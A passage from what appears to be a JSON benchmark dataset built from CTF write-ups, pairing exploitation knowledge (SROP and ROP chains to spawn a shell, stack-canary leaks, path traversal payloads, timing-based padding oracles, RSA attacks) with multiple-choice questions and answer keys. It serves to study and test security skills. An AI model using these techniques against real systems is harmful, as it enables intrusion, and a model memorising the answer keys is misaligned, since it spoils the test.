            "When developing a Python script to interact with a CTF challenge server for automating the process of retrieving and sending data, which of the following demonstrates the correct use of the `pwn` library to establish a network connection, receive a data string from the server, and close the connection?  - A. ```python from pwn import * connection = connect(\"challenge.ctf.games\", 31260) data = connection.recv() connection.disconnect() ```  - B. ```python from pwn import * r = remote(\"example.com\", 12345) challenge_prompt = r.recv().decode() r.sendline(\"response\") r.close() ```  - C. ```python import pwn r = pwn.remote(\"challenge.ctf.games\", 31260) flag = r.recvline() print(flag) r.close() ```  - D. ```python from pwn import * r = remote(\"challenge.ctf.games\", 31260) challenge_prompt = r.recvline().decode() r.sendline(\"<solution>\") flag = r.recvline().decode() print(flag) r.close() ``` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Moving signals",
        "write_up": "dataset/raw/Moving signals.md",
        "type": "pwn",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 442,
        "max_score": 1000,
        "difficulty": 0.442,
        "knowledge": [
            "When encountering a binary pwn challenge suggesting the use of the Sigreturn Oriented Programming (SROP) technique, three primary conditions must be met:\n   - A buffer overflow vulnerability to overwrite the stack's return address.\n   - The presence of `syscall` and `pop_rax` (or equivalent) gadgets within the binary for invoking the sigreturn syscall.\n   - Sufficient stack space to accommodate the sigcontext frame.\n   If these conditions are satisfied, an exploit can be crafted by overwriting the return address to redirect execution flow, employ `pop_rax` to set the `rax` register to `15` (the syscall number for `sigreturn` on x86_64 architectures), call `syscall`, and finally construct a frame on the stack to control the state of the processor at the time of the syscall. This technique allows for the execution of arbitrary code, even when direct code execution is not possible due to limitations or protections within the binary.",
            "In scenarios where direct execution of `/bin/sh` is the goal, and the binary meets the SROP prerequisites while also containing a string such as `/bin/sh`, crafting the sigcontext frame to invoke the `execve` syscall with the address of the string `/bin/sh` can effectively spawn a shell. This requires setting the `rax` register to the syscall number of `execve` (59 on x86_64), setting the `rdi` register to point to the string `/bin/sh`, and ensuring `rsi` and `rdx` are cleared (typically set to 0), which represent arguments and environment pointers respectively for the `execve` call.\n   \nExample payload component for setting up `rax` and invoking `syscall`:\n   \n`exploit=b'A'*8 + pop_rax + p64(0xf) + syscall_gadget + sigcontext_frame`\n\nThe `sigcontext_frame` would be structured to control register values during the execution of the `sigreturn` syscall, tailored to invoke `execve(\"/bin/sh\", 0, 0)`."
        ],
        "question": [
            "In the context of exploiting a binary using the Sigreturn Oriented Programming (SROP) technique, which of the following is a condition that must be fulfilled for a successful exploitation? - A. A decryption routine that allows modifying encrypted data in runtime. - B. A `syscall` and `pop_rax` gadget in the binary for invoking the `sigreturn` syscall. - C. A direct string comparison vulnerability that allows bypassing authentication mechanisms. - D. Sufficient encryption keys hardcoded within the binary to decrypt sensitive information. ",
            "When crafting an exploit to execute `/bin/sh` in a binary that allows for Sigreturn Oriented Programming (SROP), which of the following is crucial to correctly set up before invoking the `syscall` command? - A. The `rax` register must be set to the syscall number for `exit` to ensure the program does not crash. - B. The `rdi` register must point to a fake stack frame to bypass stack canaries. - C. Setting the `rip` register to point directly to the `/bin/sh` string in binary to prompt execution. - D. Correctly setting the `rax` register to `59`, the syscall number for `execve`, and ensuring `rdi`, `rsi`, and `rdx` are tailored for execution of `/bin/sh`. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "mra",
        "write_up": "dataset/raw/mra.md",
        "type": "crypto",
        "competition": [
            "DEFCON/2021/Quals",
            "https://ctftime.org/event/1254/tasks/"
        ],
        "score": 121,
        "max_score": 343,
        "difficulty": 0.35276967930029157,
        "knowledge": [
            "When dealing with aarch64/Linux-based statically-linked and stripped binaries that involve stack-based buffer overflows (BOF) and Return Oriented Programming (ROP) for exploiting, one efficient way to achieve arbitrary code execution is to use the `svc #0` instruction for system calls. This can be leveraged by finding a suitable gadget within the binary that allows controlling the system call number and arguments (`x0` to `x2`) by loading values from the stack and executing an `svc #0`. This method can be used to first execute a `read` system call to read arbitrary data into a controlled memory location (like the binary's BSS section), and then chain another system call like `execve` to execute arbitrary commands, such as spawning a shell.",
            "For exploiting string functions that process input based on special characters (like `%` in the case of `strcpy`), sending payloads that include these characters followed by null bytes can bypass length checks and enable buffer overflow. This technique can be particularly effective in situations where the vulnerable function relies on certain characters to transform the input in a way that does not properly account for null termination or that lacks boundary checks altogether. By carefully crafting payloads that exploit these behaviors, attackers can overflow buffers and control program flow even under constraints that would otherwise limit the payload size. A practical payload format in such cases could be `\"%\\x00<overflow_data_here>\"`, where `<overflow_data_here>` is crafted to overrun buffers and manipulate program execution flow, enabling the injection of ROP chains or other malicious code sequences."
        ],
        "question": [
            "In a CTF challenge involving an aarch64/Linux-based statically-linked, stripped binary, you identified a vulnerability that could be exploited using a buffer overflow (BOF) and Return Oriented Programming (ROP). Given the binary allows execution of system calls using the `svc #0` instruction, how would you order your payload to first pop a shell using the execve system call? - A. Load `x0` with the address of `/bin/sh\\0`, `x8` with the syscall number for `execve`, and execute `svc #0`. - B. Execute `svc #0` with random values in `x0` to `x2`, hoping to accidentally trigger a useful syscall. - C. Set `x0`, `x1`, and `x2` to point to shellcode injected into the stack and then execute `svc #0`. - D. Use the syscall number for `read` in `x8` to read `/bin/sh\\0` into the BSS section, adjust the stack pointer to chain to another gadget setting `x8` with the syscall number for `execve`, and reload `x0` to `x2` with appropriate values before another `svc #0`. ",
            "During a buffer overflow exploit against a function that decodes percent-encoded input like `strcpy`, you discovered it stops processing upon a null byte. Which of the following payloads would effectively bypass the length check and allow for a buffer overflow in this scenario? - A. Send a payload of `\"%25\\x00AAAA...\"` hoping to replace `%` with its ASCII equivalent. - B. Send a payload of `\"%%\\x00AAAA...\"` trying to encode null bytes as `%00`. - C. Use a payload formatted as `\"XXXX%\\x00YYYY...\"`, where `XXXX` is a valid percent-encoded value and `YYYY...` overflows the buffer. - D. Send a payload of `\"%\\x00overflow_data\"` to leverage the improper handling of null-termination post special character processing. "
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "MSB",
        "write_up": "dataset/raw/MSB.md",
        "type": "crypto",
        "competition": [
            "DownUnderCTF/2020",
            "https://ctftime.org/event/1084/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In a scenario with RSA cryptosystem where multiple public keys (n1, n2, n3, ...) are provided and it's known that one of the prime factors (p1, p2, p3, ...) of these keys slightly differs while the other prime factors stay the same across the different keys, one can apply the technique of implicit factoring. This method relies on constructing a matrix that represents the products and differences of the given ns (public keys) and utilizing the LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz) algorithm to find the short lattice vector that leads to discovering the common prime factors. This approach can effectively break the RSA encryption under the specific condition that there's a small difference between the prime factors across different ns.",
            "When dealing with RSA challenges that provide multiple encryption instances involving primes of significantly different sizes (e.g., one prime is twice the size of the other), and especially when a part of the larger prime remains constant across different instances, constructing a matrix that encapsulates the key information (e.g., multiples of a large constant and differences between the ns) and applying the LLL algorithm to this matrix can reveal the shared prime factor. This technique leverages the mathematical properties of the LLL algorithm to find a basis for the lattice formed by the problem's parameters, thus enabling the factorization of the ns despite the only implicit hint of the shared bits."
        ],
        "question": [
            "In the context of RSA encryption, when attempting to factorize public keys where one of the prime factors (p) slightly varies across multiple instances while the other remains constant, which technique is best suited for discovering the common prime factors? - A. Brute force search for prime factors across each n. - B. Utilizing the LLL algorithm to analyze constructed matrices representing ns products and differences. - C. Applying the Extended Euclidean Algorithm to find the greatest common divisor (GCD) among the ns. - D. Using the Sieve of Eratosthenes to sequentially eliminate non-prime numbers until the common factors are found.",
            "When faced with an RSA factorization challenge that involves several ns (public keys) constructed from prime factors of significantly differing sizes, with a portion of the larger prime staying constant across instances, which step is most critical for leveraging the LLL algorithm to uncover the shared prime factor? - A. Pre-computing the prime factors of smaller ns to reduce the complexity of the LLL algorithm. - B. Generate a matrix incorporating multiples of a large constant and the differences between the public keys (ns), then applying the LLL algorithm. - C. Directly applying the LLL algorithm to each n individually without constructing a matrix. - D. Finding the least significant bits of the smaller primes without considering their differences or constructing a specific matrix."
        ],
        "answer": [
            "B.",
            "B."
        ]
    },
    {
        "name": "music",
        "write_up": "dataset/raw/music.png.md",
        "type": "misc",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": -1.0,
        "max_score": 952,
        "difficulty": -1,
        "knowledge": [
            "When encountering files with seemingly random or obscured content, consider applying steganography decoding techniques, specifically targeting the Least Significant Bit (LSB) method. Tools like Zsteg can be employed to analyze the image and extract hidden information. This method is particularly useful in challenges where the file does not appear to contain any overtly useful data at first glance. \n   - Example command: `zsteg -all filename.png`",
            "If the output from steganography tools yields unusual or encrypted text, conduct online searches with the obtained strings. This approach can reveal hints or direct solutions, especially in challenges where the output relates to widely known references or URLs. The extracted information might not be the flag itself but rather a clue leading to the solution.\n   - Unable to provide a specific search query example as it will vary depending on the output text extracted from the steganography tool."
        ],
        "question": [
            "When attempting to uncover hidden data within an image file that displays a random pattern of colors, which technique is particularly effective for extracting information that isn't immediately noticeable and what tool is commonly used for this purpose? - A. Use an MD5 hash checker with the image to find encrypted messages. - B. Employ a tool like Zsteg to analyze the image for data hidden using the Least Significant Bit (LSB) method. - C. Apply an OCR (Optical Character Recognition) software to detect secret text in the image. - D. Convert the image into a binary file and search for plaintext messages. ",
            "Upon retrieving a string of text that appears to be nonsensical or encrypted after using a steganography tool on an image, what should be the next step to potentially uncover more information or solve the puzzle? - A. Immediately try to decrypt the text using common decryption tools without further analysis. - B. Ignore the text as it is likely intended to mislead and focus on the image properties instead. - C. Perform an online search with the extracted text or any distinctive part of it, as it may lead to useful references or the solution itself. - D. Modify the image's color palette based on the extracted text to reveal hidden images or text. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "My First C Program!",
        "write_up": "dataset/raw/My First C Program!.md",
        "type": "This write-up describes a reverse engineering challenge.",
        "competition": [
            "DownUnderCTF/2023",
            "https://ctftime.org/event/1954/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing C programs or similar code snippets in CTF challenges, it's crucial to pay attention to unconventional syntax or semantics introduced by the challenge, such as custom operators (e.g., \"!!\" and \"!!!\") or unexpected language behaviors (e.g., arrays working from -1). Understanding these peculiarities can be key to deciphering the code's logic and finding the flag. This approach can be applied when encountering code that deviates from standard programming patterns or syntax, indicating that the challenge might involve interpreting or correcting the given code based on its unique rules.",
            "String manipulation techniques, including string interpolation, concatenation, and character manipulation through custom functions, often play a significant role in solving CTF challenges. Knowledge of how these operations work, even under non-standard conditions (like in a fictional programming language or with unusual syntax), can help in piecing together the flag from various code segments. This strategy is valuable in challenges where the flag is split into different components or obscured through complex operations. Understanding the basic principles of these manipulations allows for the application of similar logic across different programming languages and scenarios encountered in challenges."
        ],
        "question": [
            "When analyzing a given code segment in a CTF challenge that seems to feature unconventional language syntax, such as arrays being accessed with a negative index (e.g., arrays working from -1), which of the following standard programming concepts does this most closely challenge?  - A. Strong typing - B. Memory safety - C. Standard array indexing - D. Data encapsulation ",
            "In the context of string manipulation for CTF challenges, when given a code snippet that uses string concatenation and interpolation in unconventional ways (for example, creating a string from multiple variables and constant strings combined), which of the following techniques is most directly being tested?  - A. Object-oriented programming - B. Conditional logic - C. Loop control flow - D. String manipulation "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "My Project",
        "write_up": "dataset/raw/My Project.md",
        "type": "This write-up describes a challenge that involves exploiting a vulnerability related to path traversal in a web application. Upon analyzing the provided code snippet, it is clear that the challenge falls under the category of **web**.",
        "competition": [
            "Chujowy/2020",
            "https://ctftime.org/event/1087/tasks/"
        ],
        "score": 203,
        "max_score": 500,
        "difficulty": 0.406,
        "knowledge": [
            "When attempting a path traversal exploit in a web application, identifying functionality that manipulates files\u2014such as concatenating user-provided files\u2014can be leveraged to place files in unintended directories. This method is particularly useful if the application appends user data to files within server-controlled directories without proper validation of file names or paths. \n    - Example payload snippet for path traversal using file manipulation functionality:  \n    ```python\n    files = {\"file\": (\"filename\", \"filecontent\")}\n    params = {\"filename1\": \"../secure/targetfilename\"}\n    response = requests.post(\"http://targetsite.com/concat\", files=files, params=params)\n    ```",
            "When exploiting path traversal vulnerabilities, especially in web applications hosting critical functionality like accessing a secure directory, constructing the payload requires careful consideration of the web application's file handling logic, including how files are named, stored, and accessed. This strategy can enable an attacker to bypass checks or restrictions placed on accessing or executing specific files (e.g., accessing a file intended to be secure by manipulating the path to escape the intended directory).\n    - Example payload for bypassing restrictions to execute or access secure files:  \n    ```python\n    response = requests.get(\"http://targetsite.com/flag/{}\".format(\"filename\" + \"calculatedUUID\"))\n    ```"
        ],
        "question": [
            "When leveraging a path traversal exploit to manipulate file paths in a web application, which technique allows for placing files in arbitrary directories by exploiting file concatenation functionalities? - A. Using URL encoding to bypass path filters. - B. Exploiting server-side request forgery (SSRF) to redirect file writes. - C. Concatenating user-provided files with server-controlled directories without proper validation. - D. Implementing cross-site scripting (XSS) to modify DOM-based file paths.",
            "In the context of exploiting path traversal vulnerabilities to access secure directories within a web application, what critical aspect should be considered when constructing the payload? - A. The importance of SSL/TLS in encrypting the payload to avoid detection. - B. The necessity of using HTTP GET requests exclusively to ensure payload delivery. - C. The logic of how the web application handles file naming, storage, and access to bypass checks. - D. The use of obfuscated JavaScript to prevent client-side payload blocking."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "My Sieve",
        "write_up": "dataset/raw/My Sieve.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 477,
        "max_score": 477,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with RSA encryption challenges and a given encrypted message, if you have an output file from a factorization tool like msieve for a large number associated with the challenge, you can use the factors found to compute the private key and decrypt the message. This typically involves decomposing the modulus N into its prime factors, computing \u03c6(N) as (p-1)*(q-1) where p and q are the prime factors, then computing the modular multiplicative inverse of e mod \u03c6(N) to get the private key d. The encrypted message can then be decrypted using d.\n   \n   - Given:\n     - Two prime factors \\( p \\) and \\( q \\)\n     - Public exponent \\( e \\)\n     - Encrypted message \\( enc \\)\n   - Compute:\n     - \\( N = p \\cdot q \\)\n     - \\( \\phi(N) = (p-1) \\cdot (q-1) \\)\n     - \\( d = e^{-1} \\mod \\phi(N) \\)\n   - Decrypt the message:\n     - \\( \\text{flag} = enc^d \\mod N \\)\n   - Python snippet for RSA decryption:\n     ```python\n     from Crypto.Util.number import *\n     \n     p = 37517726695590864161261967849116722975727713562769161\n     q = 41223455646589331474862018682296591762663841134030283\n     e = 0x10001\n     N = p * q\n     phi = (p - 1) * (q - 1)\n     d = pow(e, -1, phi)\n     enc = 17774316754182701043637765672766475504513144507864625935518462040899856505354546178499264702656639970102754546327338873353871389580967004810214134215521924626871944954513679198245322915573598165643628084858678915415521536126034275104881281802618561405075363713125886815998055449593678564456363170087233864817\n     flag = long_to_bytes(pow(enc, d, N))\n     print(flag)\n     ```",
            "In RSA CTF challenges where the public key or parts of it seem corrupted or partially hidden, try all possible substitutions if the number of unknowns is small. Specifically, when a public key component such as the modulus N is only partially given with missing bits represented by placeholders (e.g., `*`), brute-force through all possible values of these placeholders if feasible. A practical approach is to compute the GCD (Greatest Common Divisor) of all candidate moduli with a known related value to identify the correct modulus by finding a GCD greater than 1.\n   \n   - Given:\n     - Partial or corrupted modulus \\( N \\) with unknown bits\n     - A related integer \\( X \\) from factorization data (e.g., from msieve output)\n   - Method:\n     - Iterate through all possible substitutions for the unknown bits in \\( N \\)\n     - Compute \\( \\gcd(N, X) \\) for each candidate \\( N \\)\n     - If \\( \\gcd(N, X) > 1 \\), the candidate \\( N \\) shares a factor with \\( X \\), indicating a potential match\n   - Python snippet to find the correct \\( N \\) by searching through all possible combinations of the missing bits:\n     ```python\n     from math import gcd\n\n     # Example with simplified numbers and scenario\n     corrupt_N = 0xA... # partially known N with placeholders for missing bits\n     X = 0x1...  # known integer related to N, from msieve output\n     \n     for possible_N in all_possible_substitutions(corrupt_N):\n         if gcd(possible_N, X) > 1:\n             print(f\"Found matching N: {possible_N}\")\n             break\n     ```\n   - Note: This approach requires adjusting the search method `all_possible_substitutions` to fit the scenario, which might involve replacing characters or bits at specified positions."
        ],
        "question": [
            "In the process of decrypting an RSA-encrypted message after factoring the modulus \\( N \\) using tools like msieve, what crucial step is performed immediately after obtaining the prime factors \\( p \\) and \\( q \\) of \\( N \\)? - A. Calculate \\( e^{p+q} \\mod N \\) - B. Compute \\(\\phi(N) = (p-1) \\cdot (q-1)\\) - C. Subtract \\( p \\) from \\( q \\) and divide by \\( N \\) - D. Multiply \\( p \\) and \\( q \\) to get a new \\( N \\) ",
            "When attempting to correct a corrupted RSA public key modulus \\( N \\) with a known related integer \\( X \\) from factorization data, what condition indicates that a candidate \\( N \\) is the correct modulus during the brute-force search? - A. \\( \\gcd(N, X) = N \\) - B. \\( \\gcd(N, X) = 1 \\) - C. \\( \\gcd(N, X) > 1 \\) - D. \\( \\gcd(N, X) \\) equals the original \\( N \\) "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Mysterious Broadcast",
        "write_up": "dataset/raw/Mysterious Broadcast.md",
        "type": "web",
        "competition": [
            "SpaceHeroes/2022",
            "https://ctftime.org/event/1567/tasks/"
        ],
        "score": 100,
        "max_score": 991,
        "difficulty": 0.10090817356205853,
        "knowledge": [
            "When faced with a mysterious or encrypted message in a CTF challenge, examining the format and content for patterns or known encodings can be a first step. If the message appears to be binary and related to a hint given in the challenge description (such as a reference to a specific number that suggests a bit-length), one approach is to break down the message into segments based on this bit-length and then convert these segments into a more understandable format like ASCII. Tools and commands like `fold`, `tr`, and scripting in Bash can be effective in manipulating the message format for further analysis.\n    - Example approach: Convert a binary sequence split into 7-bit segments into ASCII characters.\n    - Command used: `fold -b7 sequence.in | tr \"\\n\" \" \" > data.in` followed by a binary to ASCII conversion script.",
            "If the output from converting binary data into ASCII yields a string that seems encoded but not directly readable, it's necessary to identify the encoding used and apply the correct decoding technique. A common encoding encountered in CTF challenges is Base64. The Linux command line provides tools such as `base64` for decoding such encoded strings. This step often reveals hidden messages, keys, or flags necessary for challenge completion.\n    - Example approach: Decode a Base64 encoded string to reveal the flag or message.\n    - Command used: `echo \"encoded_string\" | base64 -d`"
        ],
        "question": [
            "In a Capture The Flag (CTF) challenge, you're given a long binary sequence and a hint that the information is segmented in a unique fashion related to the narrative of the problem. If you are to analyze this binary data assuming each segment represents an ASCII character, which Linux command could help you prepare this data if the hint suggests using a 7-bit segmentation? - A. `fold -w7 sequence.in | tr \"\\n\" \" \" > data.in` - B. `cut -d7 sequence.in | tr \"\\n\" \" \" > data.in` - C. `split -b7 sequence.in | tr \"\\n\" \" \" > data.in` - D. `fold -b7 sequence.in | tr \"\\n\" \" \" > data.in`",
            "After converting a binary sequence to ASCII, you suspect the output is encoded because it\u2019s not human-readable but resembles a format you have encountered before. Which Linux command would you use to decode this output if you suspect it's Base64 encoded, based on your experience in similar cybersecurity challenges? - A. `echo \"output_string\" | base64 --decode` - B. `echo \"output_string\" | decode -Base64` - C. `print \"output_string\" | base64 -d` - D. `echo \"output_string\" | base64 -d`"
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "Mysterious Masquerading Message",
        "write_up": "dataset/raw/Mysterious Masquerading Message.md",
        "type": "crypto",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 100,
        "max_score": 700,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "When encountering strings within data that looks like encoded or encrypted content, consider classical ciphers and common encoding schemes as initial vectors for decryption. Caesar cipher (or ROT13 for a 26-letter alphabet) can be identified by simple substitution patterns, Base64 encoding often ends with \u2018=\u2019 symbols, and hexadecimal strings usually consist of characters ranging from 0-9 and A-F. These can serve as clues to start the decryption process. \n\n   - Caesar cipher/ROT13 example payload: Given a ciphertext \"tbbq yhpx:)\", decoding it with ROT13 would reveal \"good luck:)\".",
            "When provided with hexadecimal strings in the context of cryptographic challenges, and clues hint towards encryption keys and initialization vectors (IVs), the strings could represent AES encryption details. The process involves converting hexadecimal representations to their ASCII equivalents which could signify keys, IVs, or encrypted messages. For AES decryption, having the ciphertext, the key, and IV allows for the decryption using AES Decrypt tools.\n\n   - AES decryption example payload: Given ciphertext \"90988c9befe5ea3f5a91effe03060a8714dfc20088415570b394ce9cd32be718\", key \"ineedtoopenlocks\", and IV \"initialisation12\", use an AES Decrypt tool configured for the appropriate mode (e.g., CBC) to decrypt the message."
        ],
        "question": [
            "In a cybersecurity challenge, you encounter a string \"tbbq yhpx:)\" that seems to be encrypted or encoded. Which method would most likely reveal the original message when decoding this string? - A. Applying MD5 hash decoding - B. Decrypting using AES encryption method - C. Decoding with ROT13 cipher - D. Converting from Morse code",
            "Given hex strings \"696e656564746f6f70656e6c6f636b73\" and \"696e697469616c69736174696f6e3132\" in a cryptographic context, which are suspected to represent AES encryption details, what is the next step in decrypting an AES encrypted message? - A. Use the strings directly as binary data for RSA decryption - B. Convert the hex strings into ASCII and use them as key and IV for AES decryption - C. Perform a SHA-256 hash of the hex strings to generate an AES key - D. Translate the hex strings into Base64 encoding for use in DES decryption"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Mysterious RSA",
        "write_up": "dataset/raw/Mysterious RSA.md",
        "type": "crypto",
        "competition": [
            "MetaCTF/2020",
            "https://ctftime.org/event/1106/tasks/"
        ],
        "score": 350,
        "max_score": 525,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "For RSA encryption challenges where the same message is encrypted multiple times with different public keys (N, E), H\u00e5stad's broadcast attack is applicable. This attack leverages the fact that with enough (E) ciphertexts, one can use the Chinese Remainder Theorem (CRT) to recover the plaintext message. The attack is particularly effective when the public exponent E is small and the same for all encryptions. \n   \n   Example condition: The RSA encryption is using a small, public exponent `E` and encrypting the same message with different `N` values.\n   \n   Sample Python snippet for collection:\n   ```python\n   # Example for collecting cipher texts with their N and E\n   import requests\n   import re\n   \n   url = \"https://example-ctf-site.com/rsa-challenge\"\n   for i in range(100):  # Collect multiple samples\n       response = requests.get(url).text\n       # regex to strip HTML and extract N, E, C\n       data = re.sub('<[^<]+?>', '', response).split('\\n\\n')\n       n, e, ct = data[0], data[1], data[2]\n       # Process and store N, E, and C for attack\n   ```",
            "Implementing H\u00e5stad's broadcast attack involves using the Chinese Remainder Theorem (CRT) to combine the collected ciphertexts and recover the original message. This step computes a value `x` from the ciphertexts and moduli, then extracts the `e`th root of `x` to get the plaintext. The CRT computation combines the different ciphertexts (each corresponding to a different N) into a single x value, from which the plaintext message is derived if x is smaller than the smallest N.\n\n   Example condition: Possessing multiple ciphertexts for the same plaintext encrypted with RSA, where each ciphertext has a unique modulus `N` but shares a common exponent `E`.\n\n   Sample Python snippet for attack implementation:\n   ```python\n   import gmpy2\n   \n   def crt_attack(ciphertexts, moduli, e):\n       # Chinese Remainder Theorem to find x satisfying x \u2261 c_i (mod n_i) for all i\n       x = gmpy2.crt(ciphertexts, moduli)[0]\n       # Assuming the plaintext m is small enough, try extracting the e'th root of x\n       m, exact = gmpy2.iroot(x, e)\n       if exact:\n           return int(m).to_bytes((m.bit_length() + 7) // 8, 'big').decode('utf-8')\n       else:\n           return \"Failed to extract the message\"\n   \n   # Example usage\n   C = [123456, 234567, 345678]  # Example ciphertexts\n   N = [987654321, 876543219, 765432198]  # Corresponding moduli\n   e = 3  # Common exponent\n   message = crt_attack(C, N, e)\n   print(\"Recovered message:\", message)\n   ```\nThis Python script demonstrates the steps necessary to implement H\u00e5stad's attack, showcasing how RSA's mathematical properties can be exploited under specific conditions to decrypt a message without the private key."
        ],
        "question": [
            "In a CTF challenge where the same message is encrypted multiple times with different RSA public keys (N, E), and the public exponent E is small, which attack would be particularly effective for decrypting the message?  - A. Brute force attack on N - B. H\u00e5stad's broadcast attack - C. Frequency analysis - D. Differential cryptanalysis ",
            "Given multiple ciphertexts for the same plaintext message encrypted with RSA, each having a unique modulus (N) and sharing a common small exponent (E), which method below outlines the correct approach for leveraging the Chinese Remainder Theorem (CRT) to decrypt the message?  - A. Use CRT to find a value x that satisfies x \u2261 c_i (mod n_i) for all i, and then extract the e'th root of x to get the plaintext message. - B. Calculate the greatest common divisor (GCD) of all N to find the private key. - C. Directly calculate the e'th root of each ciphertext to get the plaintext messages and then combine them. - D. Use CRT to directly calculate the RSA private key from the public exponent E and all the ciphertexts. "
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "n1ogin",
        "write_up": "dataset/raw/n1ogin.md",
        "type": "crypto",
        "competition": [
            "N1CTF/2021",
            "https://ctftime.org/event/1367/tasks/"
        ],
        "score": 688,
        "max_score": 1000,
        "difficulty": 0.688,
        "knowledge": [
            "When facing hybrid encryption mechanisms within a CTF challenge, particularly those involving RSA, AES, and HMAC, an effective attack strategy involves performing a CBC padding oracle attack when direct cryptographic vulnerabilities seem mitigated. Given that error messages from the server are generic or indistinguishable, one can use timing differences in the server's response to differentiate between types of errors encountered (e.g., padding errors vs HMAC verification errors). This approach requires analyzing how server response times vary when incorrect padding or HMAC values are supplied, using the premise that HMAC computation typically incurs a noticeable delay compared to padding checks.",
            "In scenarios where encryption protocols do not directly leak error information, and timing attacks are viable, implementing a remote time-based attack can be an effective method to extract sensitive information, like decryption keys or plaintext. This involves carefully crafting payloads that force the server into different computation paths (e.g., handling padding errors vs HMAC verification), then measuring the time it takes for the server to respond. A significant aspect of this approach requires distinguishing between genuine timing differences and those caused by network jitter or server load, often achieved by sending multiple requests and analyzing the minimum response time to mitigate random variables' impact."
        ],
        "question": [
            "In a CTF challenge where a hybrid encryption system is used involving RSA and AES-CBC, and generic error messages are returned by the server, which technique can be used to differentiate between padding and HMAC verification errors to mount a CBC padding oracle attack? - A.Use a static analysis of the compiled server binary to identify error handling procedures. - B.Measure the time difference in server responses to distinguish between different types of errors, considering HMAC computation usually takes longer. - C.Inspect TCP packet headers for error codes that correspond to specific cryptographic errors. - D.Analyze the source code of encryption algorithms to find built-in vulnerabilities.",
            "In a cryptographic challenge where detailed error messages are obfuscated and a timing attack is considered against encryption protocol operations like padding and HMAC verification, what is a crucial factor to ensure the accuracy of a remote time-based oracle attack? - A.The strength of the RSA public key used for encryption. - B.The exact version of the encryption libraries used by the server. - C.Accurately differentiating between genuine timing differences and those caused by external factors like network jitter or server load. - D.The complexity of the password or secret key being used in the encryption process."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Name Tag",
        "write_up": "dataset/raw/Name Tag.md",
        "type": "pwn",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When performing static and dynamic analysis on a binary challenge, it's crucial to identify binary protections such as stack canaries, NX (Non-Executable stack), PIE (Position Independent Executable), and RELRO (Relocation Read-Only) levels. These protections influence the development of exploit strategies, such as the need for Return-oriented Programming (ROP) due to NX or leveraging static addresses for ROP gadgets because of the absence of PIE. Additionally, attention should be paid to anti-debugging measures such as the binary's use of `ptrace` to prevent debugger attachment, which can be circumvented by patching the binary to change the syscall number of `ptrace` to a no-operation equivalent or by finding and modifying the instructions leading to the syscall.",
            "In challenges involving stack-based vulnerabilities, leaking the stack canary and exploiting buffer overflows can be executed by abusing unprotected `read` or `printf` functions. If an application reads user input into a buffer without properly enforcing its size limit and ends with a vulnerable function call like `printf` without a terminating null byte, it's possible to read past the intended buffer. This behavior can leak memory contents, including the stack canary. By carefully crafting input that includes filling the buffer and partially overwriting the stack canary (forcing a non-zero value to zero if the canary always ends in zero), one can obtain the canary value from the program's output. Subsequent writes can then fully control the stack, allowing for ROP chains or other exploits, provided the inputs are crafted to bypass or correctly spoof the stack canary, preserving program execution integrity.\n\nExample overflow payload to leak the stack canary (assuming first_name buffer is directly before the canary and no null byte is enforced): `\"A\"*40 + \"B\"` where 40 \"A\"s fill the buffer and \"B\" operates as a delimiter for identifying the beginning of leaked contents, enabling the extraction of the canary value for crafting subsequent exploit payloads."
        ],
        "question": [
            "In an analysis of a binary challenge, if the binary exhibits the following security protections as identified by tools like `checksec` or during dynamic analysis:  - Partial RELRO - Stack Canary - NX (Non-Executable Stack) - No PIE (Position Independent Executable)  And employs anti-debugging measures through a syscall such as: ```c syscall mov    DWORD PTR [rbp-0x4],eax cmp    DWORD PTR [rbp-0x4],0xffffffff jne    4015cf <init+0x3c> mov    edi,0x0 call   401040 <_exit@plt> ``` What action can effectively bypass the anti-debugging technique to allow for debugging with tools such as GDB? - A. Change the initial `mov rax, 0x56` instruction to `mov rax, 0x57` to alter the syscall to a no-op - B. Increase the value in `cmp    DWORD PTR [rbp-0x4],0xffffffff` to bypass the exit condition - C. Remove the `syscall` instruction to prevent the anti-debugging technique from executing - D. Directly comment out the anti-debugging section using a binary editor before debugging ",
            "During the exploitation of a binary challenge involving stack canaries, if an analyst finds a vulnerability in the way `printf` is used to print user-controlled buffers (e.g., `first_name` and `last_name`), which of the following inputs could potentially leak the stack canary, given that `first_name` is read into a buffer with inadequate boundary checking? - A. Supplying `\"A\"*40 + \"B\"` as input to the `first_name` field, ensuring \"B\" denotes the beginning of the leaked canary - B. Supplying `\"C\"*40 without a terminating character, hoping to leverage buffer runtime concatenation - C. Filling the `last_name` buffer with 112 bytes of \"D\", assuming it directly precedes the `first_name` buffer in memory layout - D. Inputting 40 characters of \"E\" followed by a null byte into `first_name`, aiming to trigger an error through null byte insertion "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Nameless",
        "write_up": "dataset/raw/Nameless.md",
        "type": "crypto",
        "competition": [
            "HexionCTF/2020",
